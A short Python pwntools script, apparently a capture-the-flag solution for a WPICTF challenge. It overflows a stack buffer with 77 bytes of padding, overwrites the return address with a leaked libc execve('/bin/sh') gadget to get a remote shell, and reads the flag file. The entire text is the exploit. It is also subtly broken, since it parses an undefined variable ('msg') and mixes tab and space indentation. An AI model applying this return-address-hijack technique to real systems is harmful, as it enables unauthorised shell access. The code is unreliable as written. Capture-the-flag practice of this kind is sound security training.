from pwn import *

class DorsiaExploit:

	def levelone(self):
  
    # Create data to fill the buffer
		JUNK = 'A' * 77
    
    # Connect to the server
		r = remote('dorsia1.wpictf.xyz', 31337)

    # Retrieve infoleak of execve('/bin/sh',NULL,NULL) gadget from libc system()
		infoleak_libc_system_gadget = r.recvline()
		infoleak_libc_system_gadget = int(str(msg), 16)

    # Add the junk to the buffer
		PAYLOAD = JUNK
		PAYLOAD += p64(infoleak_libc_system_gadget) # Overwrite return address with gadget
    
		r.sendline(PAYLOAD) # Send the exploit
    
		r.sendline('cat flag.txt') # Cat the flag
    
		print("\nFLAG: "+r.recvline()) # Print the flag

if __name__ == "__main__":

	ex = DorsiaExploit()
	ex.levelone()
